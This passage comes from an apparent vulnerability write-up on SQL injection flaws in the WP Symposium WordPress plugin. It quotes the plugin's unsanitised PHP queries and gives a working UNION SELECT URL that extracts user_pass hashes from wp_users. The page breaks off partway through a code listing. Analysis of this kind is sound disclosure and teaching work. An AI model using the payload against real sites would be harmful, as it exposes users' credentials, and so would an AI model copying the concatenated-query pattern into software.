class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-16">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-i">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-26">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-28">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// resolve stubs if using WPS permalinks</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_permalink_structure'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">'/'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-34">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE replace(display_name, ' ', '') = %s"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">last_query</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-44">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_symposium_meta</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'share'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'UID:'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;/div&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-48">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'public'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-50">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">user</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0176 seconds] -->
<p>Note that the last line takes the $uid variable as determined on the first block of code, and simply puts it straight into the query without any sort of inputsanitation. So by creating a page with the &#8220;[symposium-profile-menu]&#8221; short-tag, we can inject into the page with a simple URL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a567461570560" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a567461570560-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a567461570560-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><strong>Analysis of forum updateEditDetail blind SQL injection vulnerability</strong></p>
<p>This vulnerability is actually more like 2. We can see that in this standard ajax call in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_forum_functions.php">/ajax/symposium_forum_functions.php</a> file that there is a total of 4 SQL queries executed, 2 updates and 2 selects. Notice that the $_POST parameters aren&#8217;t sanitized before use, yet all but the 3rd query usesconcatenationto create the SQL query, which creates SQL injection conditions if you are logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a56d799761293" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// AJAX function to update topic details after editing
if ($_POST['action'] == 'updateEditDetails') {

	if (is_user_logged_in()) {

		$tid = $_POST['tid'];	

		$topic_subject = $_POST['topic_subject'];	
		$topic_post = $_POST['topic_post'];

		if (get_option('symposium_striptags') == 'on') {
			$topic_subject = strip_tags($topic_subject);	
			$topic_post = strip_tags($topic_post);	
		}

		$topic_post = str_replace("\n", chr(13), $topic_post);	
		$topic_category = $_POST['topic_category'];

		// Ensure safe HTML
		$topic_subject = str_replace("&lt;", "&amp;lt;", $topic_subject);	
		$topic_subject = str_replace("&gt;", "&amp;gt;", $topic_subject);	
		if (get_option('symposium_use_wysiwyg') != 'on') {
			$topic_post = str_replace("&lt;", "&amp;lt;", $topic_post);	
			$topic_post = str_replace("&gt;", "&amp;gt;", $topic_post);
		}

		if ($topic_category == "") {
			$topic_category = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_category FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));
		}

		$wpdb-&gt;query( $wpdb-&gt;prepare("UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_category = ".$topic_category." WHERE topic_parent = ".$tid) );

		$sql = "UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d";
		$wpdb-&gt;query( $wpdb-&gt;prepare($sql, $topic_subject, $topic_post, $topic_category, $tid) );

		$parent = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_parent FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));

	}

	exit;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1644">1644</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1645">1645</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1646">1646</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1647">1647</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1648">1648</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1649">1649</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1650">1650</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1651">1651</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1652">1652</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1653">1653</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1654">1654</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1655">1655</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1656">1656</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1657">1657</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1658">1658</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1659">1659</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1660">1660</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1661">1661</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1662">1662</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1663">1663</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1664">1664</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1665">1665</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1666">1666</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1667">1667</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1668">1668</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1669">1669</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1670">1670</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1671">1671</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1672">1672</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1673">1673</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1674">1674</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1675">1675</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1676">1676</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1677">1677</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1678">1678</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1679">1679</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1680">1680</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1681">1681</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1682">1682</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a56d799761293-1683">1683</div><div class="crayon-num" data-line="crayon-53c987785a56d799761293-1684">1684</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a56d799761293-1644"><span class="crayon-c">// AJAX function to update topic details after editing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1645"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'updateEditDetails'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1646">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1647"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1648">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1649"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$tid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'tid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1650">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1651"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_subject'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1652"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_post'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1653">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a56d799761293-1654"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_striptags'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1655"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1656"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span 